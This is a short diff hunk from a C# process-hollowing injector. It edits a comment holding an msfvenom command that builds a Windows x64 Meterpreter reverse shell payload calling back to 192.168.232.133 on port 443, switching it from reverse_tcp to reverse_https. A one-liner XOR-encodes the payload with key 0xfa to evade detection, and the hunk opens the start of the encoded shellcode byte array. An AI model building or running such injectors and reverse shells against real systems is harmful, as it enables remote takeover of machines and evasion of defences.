@@ -84,7 +84,7 @@ namespace ProcessHollowing
                 return;
             }
 
-            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp | python3 -c 'import sys; key=0xfa; data=sys.stdin.buffer.read(); print("The payload is: " + ", ".join(f"0x{(b^key):02x}" for b in data) + ",")'
+            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp | python3 -c 'import sys; key=0xfa; data=sys.stdin.buffer.read(); print("The payload is: " + ", ".join(f"0x{(b^key):02x}" for b in data) + ",")'
             // XORed with key 0xfa
             byte[] buf = new byte[511] {
             0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
